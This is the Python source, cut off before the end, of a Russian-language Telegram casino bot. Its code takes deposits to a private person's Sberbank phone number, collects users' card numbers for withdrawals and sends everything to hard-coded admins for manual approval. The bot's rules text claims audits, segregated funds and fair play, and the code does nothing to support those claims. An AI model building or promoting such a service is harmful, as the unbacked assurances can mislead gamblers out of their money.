import os
import asyncio
import random
import string
import sqlite3
from datetime import datetime, timedelta
from contextlib import closing
from typing import Dict, Tuple, Optional
from telegram import (
    Update, 
    InlineKeyboardButton, 
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    ReplyKeyboardRemove
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters,
    ContextTypes
)

# Конфигурация
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_IDS = [8259635146, 7993168159]  # админы
SUPPORT_USERNAME = "@LEOLST"

# Способы оплаты
PAYMENT_METHODS = {
    "sber": "🏦 Сбербанк"
}

# Реквизиты для каждого способа оплаты
PAYMENT_DETAILS = {
    "sber": {
        "bank": "Сбербанк",
        "number": "+79002962952",
        "holder": "Эвелина О..",
        "instruction": "Переведите сумму на указанный номер карты"
    }
}

# Список банков для вывода
BANKS = {
    "sber": "🏦 Сбербанк",
    "tinkoff": "💳 Тинькофф",
    "yoomoney": "💰 ЮMoney",
    "alpha": "🔷 Альфа-Банк",
    "vtb": "🏛️ ВТБ",
    "gazprom": "⛽ Газпромбанк",
    "raiff": "🎯 Райффайзен",
    "other": "📱 Другой банк"
}

# Состояния для ConversationHandler
(SELECT_PAYMENT_METHOD, ENTER_DEPOSIT_AMOUNT, CONFIRM_DEPOSIT,
 ENTER_WITHDRAW_AMOUNT, SELECT_BANK, ENTER_DETAILS, CONFIRM_WITHDRAW,
 ENTER_BET_AMOUNT) = range(8)

# Инициализация базы данных
def init_db():
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                balance REAL DEFAULT 0,
                withdrawn REAL DEFAULT 0,
                deposit_invoice TEXT,
                deposit_amount REAL,
                deposit_method TEXT,
                deposit_time TIMESTAMP,
                withdraw_invoice TEXT,
                withdraw_amount REAL,
                withdraw_bank TEXT,
                withdraw_details TEXT,
                withdraw_time TIMESTAMP,
                last_bet_amount REAL DEFAULT 0
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS transactions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                type TEXT,
                amount REAL,
                status TEXT,
                invoice TEXT,
                details TEXT,
                method TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS games (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                game_type TEXT,
                bet_amount REAL,
                win_amount REAL,
                result TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()

# Функции для работы с пользователями
def get_user(user_id: int):
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        user = cursor.fetchone()
        if user:
            columns = [column[0] for column in cursor.description]
            return dict(zip(columns, user))
    return None

def create_user(user_id: int, username: str, first_name: str, last_name: str = ""):
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR IGNORE INTO users 
            (user_id, username, first_name, last_name, balance) 
            VALUES (?, ?, ?, ?, 0)
        ''', (user_id, username, first_name, last_name))
        conn.commit()

def update_balance(user_id: int, amount: float):
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", 
                      (amount, user_id))
        conn.commit()

def update_withdrawn(user_id: int, amount: float):
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET withdrawn = withdrawn + ? WHERE user_id = ?", 
                      (amount, user_id))
        conn.commit()

def set_deposit_invoice(user_id: int, invoice: str, amount: float, method: str):
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE users SET 
            deposit_invoice = ?, 
            deposit_amount = ?,
            deposit_method = ?,
            deposit_time = CURRENT_TIMESTAMP
            WHERE user_id = ?
        ''', (invoice, amount, method, user_id))
        conn.commit()

def set_withdraw_invoice(user_id: int, invoice: str, amount: float, bank: str, details: str):
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE users SET 
            withdraw_invoice = ?, 
            withdraw_amount = ?,
            withdraw_bank = ?,
            withdraw_details = ?,
            withdraw_time = CURRENT_TIMESTAMP
            WHERE user_id = ?
        ''', (invoice, amount, bank, details, user_id))
        conn.commit()

def clear_deposit_invoice(user_id: int):
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE users SET 
            deposit_invoice = NULL, 
            deposit_amount = NULL,
            deposit_method = NULL,
            deposit_time = NULL
            WHERE user_id = ?
        ''', (user_id,))
        conn.commit()

def clear_withdraw_invoice(user_id: int):
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE users SET 
            withdraw_invoice = NULL, 
            withdraw_amount = NULL,
            withdraw_bank = NULL,
            withdraw_details = NULL,
            withdraw_time = NULL
            WHERE user_id = ?
        ''', (user_id,))
        conn.commit()

def set_last_bet(user_id: int, amount: float):
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET last_bet_amount = ? WHERE user_id = ?", 
                      (amount, user_id))
        conn.commit()

def add_transaction(user_id: int, type_: str, amount: float, status: str, invoice: str, details: str = "", method: str = ""):
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO transactions (user_id, type, amount, status, invoice, details, method)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (user_id, type_, amount, status, invoice, details, method))
        conn.commit()

def add_game_history(user_id: int, game_type: str, bet_amount: float, win_amount: float, result: str):
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO games (user_id, game_type, bet_amount, win_amount, result)
            VALUES (?, ?, ?, ?, ?)
        ''', (user_id, game_type, bet_amount, win_amount, result))
        conn.commit()

def generate_invoice():
    return f"#{''.join(random.choices(string.ascii_uppercase, k=5))}"

# Основная клавиатура бота (ReplyKeyboardMarkup)
def get_main_reply_keyboard():
    keyboard = [
        ["👤 Профиль", "🎮 Игры"],
        ["💰 Финансы", "📜 Правила"],
        ["🎰 SONNET CASINO"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)

# Inline клавиатуры для сообщений
def get_main_inline_keyboard():
    keyboard = [
        [InlineKeyboardButton("📜 Пользовательское соглашение", callback_data="agreement")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_profile_keyboard():
    keyboard = [
        [InlineKeyboardButton("🔄 Обновить", callback_data="profile_refresh")],
        [InlineKeyboardButton("📊 Статистика", callback_data="game_stats")],
        [InlineKeyboardButton("🏠 В меню", callback_data="main_menu_inline")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_finances_keyboard():
    keyboard = [
        [InlineKeyboardButton("💳 Пополнить", callback_data="deposit")],
        [InlineKeyboardButton("💸 Вывести", callback_data="withdraw")],
        [InlineKeyboardButton("📋 Мои транзакции", callback_data="transactions")],
        [InlineKeyboardButton("🏠 В меню", callback_data="main_menu_inline")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_games_keyboard():
    keyboard = [
        [InlineKeyboardButton("🎲 Кубики", callback_data="game_dice")],
        [InlineKeyboardButton("🎰 Автоматы", callback_data="game_slots")],
        [InlineKeyboardButton("📊 Статистика", callback_data="game_stats")],
        [InlineKeyboardButton("🎯 Быстрая игра", callback_data="quick_game")],
        [InlineKeyboardButton("🏠 В меню", callback_data="main_menu_inline")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_payment_methods_keyboard():
    keyboard = [
        [InlineKeyboardButton("🏦 Сбербанк", callback_data="method_sber")],
        [InlineKeyboardButton("❌ Отмена", callback_data="deposit_cancel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_banks_keyboard():
    keyboard = []
    banks_list = list(BANKS.items())
    for i in range(0, len(banks_list), 2):
        row = []
        for bank_id, bank_name in banks_list[i:i+2]:
            row.append(InlineKeyboardButton(bank_name, callback_data=f"bank_{bank_id}"))
        keyboard.append(row)
    keyboard.append([InlineKeyboardButton("❌ Отмена", callback_data="withdraw_cancel")])
    return InlineKeyboardMarkup(keyboard)

def get_confirmation_keyboard():
    keyboard = [
        [
            InlineKeyboardButton("✅ Подтвердить", callback_data="confirm"),
            InlineKeyboardButton("❌ Отмена", callback_data="cancel")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_game_bet_keyboard(game_type: str):
    keyboard = [
        [InlineKeyboardButton("✅ Сделать ставку", callback_data=f"place_bet_{game_type}")],
        [InlineKeyboardButton("✏️ Изменить ставку", callback_data=f"change_bet_{game_type}")],
        [InlineKeyboardButton("❌ Отмена", callback_data="cancel_bet")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_play_again_keyboard(game_type: str, same_bet: bool = True):
    keyboard = [
        [InlineKeyboardButton("🔄 Играть еще", callback_data=f"play_again_{game_type}")],
        [
            InlineKeyboardButton("✏️ Изменить ставку", callback_data=f"change_bet_{game_type}"),
            InlineKeyboardButton("🎮 Другая игра", callback_data="games")
        ],
        [InlineKeyboardButton("🏠 В меню", callback_data="main_menu_inline")]
    ]
    if same_bet:
        keyboard[0].append(InlineKeyboardButton("💰 Та же ставка", callback_data=f"same_bet_{game_type}"))
    return InlineKeyboardMarkup(keyboard)

def get_transactions_keyboard():
    keyboard = [
        [InlineKeyboardButton("📋 Все транзакции", callback_data="all_transactions")],
        [InlineKeyboardButton("💳 Пополнения", callback_data="deposit_transactions")],
        [InlineKeyboardButton("💸 Выводы", callback_data="withdraw_transactions")],
        [InlineKeyboardButton("🏠 В меню", callback_data="main_menu_inline")]
    ]
    return InlineKeyboardMarkup(keyboard)

# Обработчики команд
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    create_user(user_id, user.username, user.first_name, user.last_name)
    
    welcome_text = f"""
✨ *Добро пожаловать в SONNET CASINO* ✨

🎰 *{user.first_name}*, приветствуем вас в нашем казино!

Здесь вы можете насладиться простыми и честными играми.
Используйте кнопки меню для навигации.

🎲 *Доступные игры:*
• 🎲 Кубики - классическая игра на удачу
• 🎰 Автоматы - испытайте удачу на слотах

💰 *Минимальный депозит:* 10 ₽
💸 *Минимальный вывод:* 100 ₽
⚡ *Быстрые выплаты*
🔒 *Полная безопасность*

*Удачной игры!* 🍀
"""
    
    await update.message.reply_text(
        welcome_text,
        parse_mode='Markdown',
        reply_markup=get_main_inline_keyboard()
    )
    
    await update.message.reply_text(
        "🎰 *Выберите действие:*",
        parse_mode='Markdown',
        reply_markup=get_main_reply_keyboard()
    )

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    
    if text == "👤 Профиль":
        await profile_command(update, context)
    elif text == "🎮 Игры":
        await games_command(update, context)
    elif text == "💰 Финансы":
        await finances_command(update, context)
    elif text == "📜 Правила":
        await rules_command(update, context)
    elif text == "🎰 SONNET CASINO":
        await casino_info(update, context)

async def casino_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    info_text = """
🎰 *SONNET CASINO*

⚡ *Основные функции:*
• 🎲 Две азартные игры
• 💳 Удобное пополнение
• 💸 Быстрый вывод
• 📊 Подробная статистика

🎯 *Особенности:*
• Минималистичный дизайн
• Простой интерфейс
• Мгновенные выплаты
• Поддержка 24/7

📞 *Техподдержка:* @LEOLST
"""
    
    await update.message.reply_text(
        info_text,
        parse_mode='Markdown'
    )

async def profile_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    user = get_user(user_id)
    
    if user:
        profile_text = f"""
📊 *Ваш профиль*

👤 *Имя:* {user['first_name']} {user.get('last_name', '')}
🆔 *ID:* {user_id}
🔖 *Юзернейм:* @{user['username'] if user['username'] else 'Нет'}
💰 *Баланс:* {user['balance']:.2f} ₽
💸 *Выведено:* {user['withdrawn']:.2f} ₽
🎮 *Последняя ставка:* {user['last_bet_amount']:.2f} ₽
"""
        
        await update.message.reply_text(
            profile_text,
            parse_mode='Markdown',
            reply_markup=get_profile_keyboard()
        )

async def finances_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💰 *Финансовые операции*\n\nВыберите действие:",
        parse_mode='Markdown',
        reply_markup=get_finances_keyboard()
    )

async def games_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎮 *Игровой зал*\n\nВыберите игру:",
        parse_mode='Markdown',
        reply_markup=get_games_keyboard()
    )

async def rules_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    rules_text = """
📜 *Правила SONNET CASINO*

🎰 *Общие правила:*
• Минимальный возраст: 18 лет
• Все игры используют ГСЧ для честности
• Вывод средств осуществляется на банковские карты

💰 *Финансы:*
├ Минимальный депозит: 10 ₽
├ Минимальный вывод: 100 ₽
├ Комиссия при выводе: 0%
└ Время обработки вывода: 1-12 часов

🎮 *Игры:*
• 🎲 Кубики: Ставки от 1 ₽, коэффициенты до x2
• 🎰 Автоматы: Ставки от 1 ₽, коэффициенты до x10

⚖️ *Обязательства:*
• Администрация оставляет за собой право проверять транзакции
• При подозрении в мошенничестве аккаунт может быть заблокирован
• Все спорные ситуации решаются через поддержку

🛡️ *Безопасность:*
• Ваши данные защищены
• Средства хранятся на отдельных счетах
• Регулярные аудиты системы

📞 *Поддержка:* @LEOLST
"""
    
    await update.message.reply_text(
        rules_text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 В меню", callback_data="main_menu_inline")]])
    )

# Inline обработчики
async def agreement(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "❌ *Упс, тут пока ничего нет*\n\nНо не переживай, раздел в разработке! 😉",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data="main_menu_inline")]])
    )

async def profile_refresh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    user = get_user(user_id)
    
    if user:
        profile_text = f"""
📊 *Ваш профиль*

👤 *Имя:* {user['first_name']} {user.get('last_name', '')}
🆔 *ID:* {user_id}
🔖 *Юзернейм:* @{user['username'] if user['username'] else 'Нет'}
💰 *Баланс:* {user['balance']:.2f} ₽
💸 *Выведено:* {user['withdrawn']:.2f} ₽
🎮 *Последняя ставка:* {user['last_bet_amount']:.2f} ₽
"""
        
        await query.edit_message_text(
            profile_text,
            parse_mode='Markdown',
            reply_markup=get_profile_keyboard()
        )

async def deposit_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    user = get_user(user_id)
    
    if user and user['deposit_invoice']:
        keyboard = [
            [InlineKeyboardButton("➡️ Перейти к счету", callback_data="active_deposit")],
            [InlineKeyboardButton("❌ Отменить счет", callback_data="cancel_active_deposit")]
        ]
        await query.edit_message_text(
            f"⚠️ *У вас уже есть активный счет для оплаты*\n\nСчет: `{user['deposit_invoice']}`\nСумма: {user['deposit_amount']} ₽",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
    
    await query.edit_message_text(
        "💳 *Выбор способа оплаты*\n\nВыберите удобный способ пополнения:",
        parse_mode='Markdown',
        reply_markup=get_payment_methods_keyboard()
    )
    
    return SELECT_PAYMENT_METHOD

async def select_payment_method(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "deposit_cancel":
        await query.edit_message_text(
            "❌ *Пополнение отменено*\n\nВозвращаемся в меню финансов...",
            parse_mode='Markdown'
        )
        await finances_command_callback(update, context)
        return ConversationHandler.END
    
    context.user_data['payment_method'] = 'sber'
    
    await query.edit_message_text(
        f"💳 *Пополнение через Сбербанк*\n\nПожалуйста, введите сумму, которую желаете пополнить:\n\n*Минимальная сумма:* 10 ₽",
        parse_mode='Markdown'
    )
    
    return ENTER_DEPOSIT_AMOUNT

# Функция для обработки суммы пополнения
async def handle_deposit_amount_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    
    try:
        amount = float(update.message.text)
        
        if amount < 10:
            await update.message.reply_text(
                "❌ *Извините, но вы не можете пополнить сумму ниже 10 рублей*",
                parse_mode='Markdown'
            )
            return ENTER_DEPOSIT_AMOUNT
        
        context.user_data['deposit_amount'] = amount
        method_name = "Сбербанк"
        
        await update.message.reply_text(
            f"💳 *Подтверждение пополнения*\n\nСпособ оплаты: *{method_name}*\nСумма: *{amount:.2f} ₽*\n\nВерно?",
            parse_mode='Markdown',
            reply_markup=get_confirmation_keyboard()
        )
        
        return CONFIRM_DEPOSIT
        
    except ValueError:
        await update.message.reply_text(
            "❌ *Пожалуйста, введите корректную сумму (число)*",
            parse_mode='Markdown'
        )
        return ENTER_DEPOSIT_AMOUNT

async def confirm_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'cancel':
        await query.edit_message_text(
            "❌ *Вы отказались от пополнения*\n\nВозвращаемся в главное меню...",
            parse_mode='Markdown'
        )
        await show_main_menu_inline(update, context)
        return ConversationHandler.END
    
    user_id = query.from_user.id
    amount = context.user_data.get('deposit_amount', 0)
    method_name = "Сбербанк"
    details = PAYMENT_DETAILS.get('sber')
    
    invoice = generate_invoice()
    set_deposit_invoice(user_id, invoice, amount, method_name)
    add_transaction(user_id, 'deposit', amount, 'pending', invoice, details['number'], method_name)
    
    payment_text = f"""
💳 *Счет на оплату создан*

📋 *Детали счета:*
├ Счет: `{invoice}`
├ Способ оплаты: *{method_name}*
├ Сумма: *{amount:.2f} ₽*
├ Банк: *{details['bank']}*
├ Реквизиты: `{details['number']}`
├ Получатель: *{details['holder']}*
└ Время на оплату: *15:00*

📝 *Инструкция:*
1. {details['instruction']}
2. В комментарии укажите: `{invoice}`
3. После перевода ожидайте проверки (до 1 часа)

⏰ *Таймер:* 15:00
"""
    
    await query.edit_message_text(
        payment_text,
        parse_mode='Markdown'
    )
    
    # Отправляем уведомление администраторам
    user = query.from_user
    user_link = f"[{user.first_name}](tg://user?id={user_id})"
    
    admin_text = f"""
📋 *Новая заявка на пополнение*

├ Счет: `{invoice}`
├ Способ: {method_name}
├ Игрок: {user_link}
├ Юзернейм: @{user.username if user.username else 'Нет'}
🆔 ID: `{user_id}`
└ Сумма: *{amount:.2f} ₽*

*Одобрить?*
"""
    
    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(
                admin_id,
                admin_text,
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Одобрить", callback_data=f"admin_approve_{invoice}"),
                     InlineKeyboardButton("❌ Отклонить", callback_data=f"admin_reject_{invoice}")]
                ])
            )
        except:
            pass
    
    return ConversationHandler.END

# Вывод средств
async def withdraw_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    user = get_user(user_id)
    
    if user and user['withdraw_invoice']:
        keyboard = [
            [InlineKeyboardButton("❌ Отменить вывод", callback_data=f"cancel_withdraw_{user['withdraw_invoice']}")]
        ]
        await query.edit_message_text(
            f"⚠️ *У вас уже есть активная заявка на вывод*\n\nНомер заявки: `{user['withdraw_invoice']}`\nСумма: {user['withdraw_amount']} ₽\nБанк: {BANKS.get(user['withdraw_bank'], user['withdraw_bank'])}\n\nОбычно выплаты занимают 1-12 часов",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
    
    await query.edit_message_text(
        "💸 *Вывод средств*\n\nПожалуйста, введите сумму, которую хотите вывести:\n\n*Минимальная сумма:* 100 ₽",
        parse_mode='Markdown'
    )
    
    return ENTER_WITHDRAW_AMOUNT

async def enter_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    user = get_user(user_id)
    
    try:
        amount = float(update.message.text)
        
        if amount < 100:
            await update.message.reply_text(
                "❌ *Сумма для вывода слишком маленькая*\nМинимальная сумма: 100 ₽\nПожалуйста, повторите попытку",
                parse_mode='Markdown'
            )
            return ENTER_WITHDRAW_AMOUNT
        
        if amount > user['balance']:
            await update.message.reply_text(
                f"❌ *Недостаточно средств на балансе!*\nВаш баланс: {user['balance']:.2f} ₽",
                parse_mode='Markdown'
            )
            return ENTER_WITHDRAW_AMOUNT
        
        context.user_data['withdraw_amount'] = amount
        
        await update.message.reply_text(
            f"💸 *Выбор банка*\n\nСумма вывода: *{amount:.2f} ₽*\n\nВыберите банк для получения средств:",
            parse_mode='Markdown',
            reply_markup=get_banks_keyboard()
        )
        
        return SELECT_BANK
        
    except ValueError:
        await update.message.reply_text(
            "❌ *Пожалуйста, введите корректную сумму (число)*",
            parse_mode='Markdown'
        )
        return ENTER_WITHDRAW_AMOUNT

async def select_bank(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "withdraw_cancel":
        await query.edit_message_text(
            "❌ *Вывод отменен*\n\nВозвращаемся в главное меню...",
            parse_mode='Markdown'
        )
        await show_main_menu_inline(update, context)
        return ConversationHandler.END
    
    bank_id = query.data.replace("bank_", "")
    context.user_data['withdraw_bank'] = bank_id
    
    bank_name = BANKS.get(bank_id, "Неизвестный банк")
    
    instructions = {
        "sber": "Введите номер карты Сбербанка (16 или 18 цифр)",
        "tinkoff": "Введите номер карты Тинькофф (16 цифр)",
        "yoomoney": "Введите номер кошелька ЮMoney",
        "alpha": "Введите номер карты Альфа-Банка (16 цифр)",
        "vtb": "Введите номер карты ВТБ (16 цифр)",
        "gazprom": "Введите номер карты Газпромбанка (16 цифр)",
        "raiff": "Введите номер карты Райффайзен (16 цифр)",
        "other": "Введите реквизиты для перевода (номер карты/счета)"
    }
    
    await query.edit_message_text(
        f"🏦 *Ввод реквизитов*\n\nБанк: *{bank_name}*\n\n{instructions.get(bank_id, 'Введите реквизиты для перевода:')}\n\nПример: `2200 1234 5678 9012`",
        parse_mode='Markdown'
    )
    
    return ENTER_DETAILS

async def enter_withdraw_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
    details = update.message.text.strip()
    
    if len(details) < 8:
        await update.message.reply_text(
            "❌ *Реквизиты слишком короткие*\nПожалуйста, введите корректные реквизиты",
            parse_mode='Markdown'
        )
        return ENTER_DETAILS
    
    context.user_data['withdraw_details'] = details
    
    amount = context.user_data.get('withdraw_amount', 0)
    bank_id = context.user_data.get('withdraw_bank', 'other')
    bank_name = BANKS.get(bank_id, "Неизвестный банк")
    
    confirmation_text = f"""
💸 *Подтверждение вывода*

📋 *Детали операции:*
├ Сумма: *{amount:.2f} ₽*
├ Банк: *{bank_name}*
└ Реквизиты: `{details}`

⚠️ *Внимание:* После подтверждения средства будут списаны с баланса

*Все верно?*
"""
    
    await update.message.reply_text(
        confirmation_text,
        parse_mode='Markdown',
        reply_markup=get_confirmation_keyboard()
    )
    
    return CONFIRM_WITHDRAW

async def confirm_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'cancel':
        await query.edit_message_text(
            "❌ *Вывод отменен*\n\nВозвращаемся в главное меню...",
            parse_mode='Markdown'
        )
        await show_main_menu_inline(update, context)
        return ConversationHandler.END
    
    user_id = query.from_user.id
    amount = context.user_data.get('withdraw_amount', 0)
    bank_id = context.user_data.get('withdraw_bank', 'other')
    details = context.user_data.get('withdraw_details', '')
    
    # Списываем средства с баланса
    update_balance(user_id, -amount)
    
    invoice = generate_invoice()
    bank_name = BANKS.get(bank_id, "Неизвестный банк")
    
    set_withdraw_invoice(user_id, invoice, amount, bank_name, details)
    add_transaction(user_id, 'withdraw', amount, 'pending', invoice, details)
    
    # Отправляем сообщение пользователю
    await query.edit_message_text(
        f"""
✅ *Заявка на вывод успешно создана!*

📋 *Детали заявки:*
├ Номер заявки: `{invoice}`
├ Сумма: *{amount:.2f} ₽*
├ Банк: *{bank_name}*
└ Реквизиты: `{details}`

⏳ *Ожидайте выплаты*\nОбычно это занимает от 1 до 12 часов в зависимости от нагрузки

🔄 *Вы можете отменить вывод до начала обработки*
        """,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Отменить вывод", callback_data=f"cancel_withdraw_{invoice}")]])
    )
    
    # Отправляем уведомление администраторам
    user = query.from_user
    user_link = f"[{user.first_name}](tg://user?id={user_id})"
    
    admin_text = f"""
💸 *Новая заявка на вывод*

├ Номер заявки: `{invoice}`
├ Игрок: {user_link}
├ Юзернейм: @{user.username if user.username else 'Нет'}
🆔 ID: `{user_id}`
├ Сумма: *{amount:.2f} ₽*
├ Банк: *{bank_name}*
└ Реквизиты: `{details}`

*Выплатить?*
"""
    
    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(
                admin_id,
                admin_text,
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("✅ Выплатить", callback_data=f"admin_withdraw_approve_{invoice}"),
                     InlineKeyboardButton("❌ Отклонить", callback_data=f"admin_withdraw_reject_{invoice}")]
                ])
            )
        except:
            pass
    
    return ConversationHandler.END

# Игры
async def game_dice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    user = get_user(user_id)
    last_bet = user['last_bet_amount'] if user else 0
    
    bet_text = "Введите сумму ставки:"
    if last_bet > 0:
        bet_text = f"Введите сумму ставки:\n\n*Последняя ставка:* {last_bet:.2f} ₽"
    
    await query.edit_message_text(
        f"🎲 *Игра в кубики*\n\n*Правила:*\n• Вы делаете ставку\n• Бот бросает 2 кубика\n• Сумма очков определяет результат\n\n🎯 *Коэффициенты:*\n• 2-6: Проигрыш (x0)\n• 7: Ничья (x1)\n• 8-12: Выигрыш (x2)\n\n{bet_text}",
        parse_mode='Markdown'
    )
    
    context.user_data['game_type'] = 'dice'
    return ENTER_BET_AMOUNT

async def game_slots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    user = get_user(user_id)
    last_bet = user['last_bet_amount'] if user else 0
    
    bet_text = "Введите сумму ставки:"
    if last_bet > 0:
        bet_text = f"Введите сумму ставки:\n\n*Последняя ставка:* {last_bet:.2f} ₽"
    
    await query.edit_message_text(
        f"🎰 *Игровые автоматы*\n\n*Правила:*\n• Вы делаете ставку\n• Крутятся 3 барабана с символами\n• Комбинации определяют выигрыш\n\n🎯 *Комбинации:*\n• 777: Джекпот (x10)\n• 3 одинаковых: Большой выигрыш (x5)\n• 2 одинаковых: Малый выигрыш (x2)\n• Остальные: Проигрыш (x0)\n\n{bet_text}",
        parse_mode='Markdown'
    )
    
    context.user_data['game_type'] = 'slots'
    return ENTER_BET_AMOUNT

async def quick_game(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    user = get_user(user_id)
    
    if not user or user['last_bet_amount'] <= 0:
        await query.answer("❌ У вас нет последней ставки", show_alert=True)
        await games_command_callback(update, context)
        return
    
    bet_amount = user['last_bet_amount']
    
    if bet_amount > user['balance']:
        await query.answer(f"❌ Недостаточно средств! Баланс: {user['balance']:.2f} ₽", show_alert=True)
        await games_command_callback(update, context)
        return
    
    # Случайно выбираем игру
    game_type = random.choice(['dice', 'slots'])
    context.user_data['game_type'] = game_type
    context.user_data['bet_amount'] = bet_amount
    
    # Запускаем игру
    await start_game(update, context, game_type, bet_amount)

async def enter_bet_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    user = get_user(user_id)
    
    try:
        bet_amount = float(update.message.text)
        
        if bet_amount < 1:
            await update.message.reply_text(
                "❌ *Минимальная ставка: 1 ₽*",
                parse_mode='Markdown'
            )
            return ENTER_BET_AMOUNT
        
        if bet_amount > user['balance']:
            await update.message.reply_text(
                f"❌ *Недостаточно средств!*\nВаш баланс: {user['balance']:.2f} ₽",
                parse_mode='Markdown'
            )
            return ENTER_BET_AMOUNT
        
        context.user_data['bet_amount'] = bet_amount
        game_type = context.user_data.get('game_type', 'dice')
        
        await update.message.reply_text(
            f"🎯 *Подтверждение ставки*\n\nИгра: *{'🎲 Кубики' if game_type == 'dice' else '🎰 Автоматы'}*\nСтавка: *{bet_amount:.2f} ₽*\n\nПодтверждаете?",
            parse_mode='Markdown',
            reply_markup=get_game_bet_keyboard(game_type)
        )
        
        return ConversationHandler.END
        
    except ValueError:
        await update.message.reply_text(
            "❌ *Пожалуйста, введите корректную сумму (число)*",
            parse_mode='Markdown'
        )
        return ENTER_BET_AMOUNT

async def place_bet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'cancel_bet':
        await query.edit_message_text(
            "❌ *Ставка отменена*\n\nВозвращаемся в главное меню...",
            parse_mode='Markdown'
        )
        await show_main_menu_inline(update, context)
        return
    
    game_type = query.data.replace('place_bet_', '')
    bet_amount = context.user_data.get('bet_amount', 0)
    
    await start_game(update, context, game_type, bet_amount)

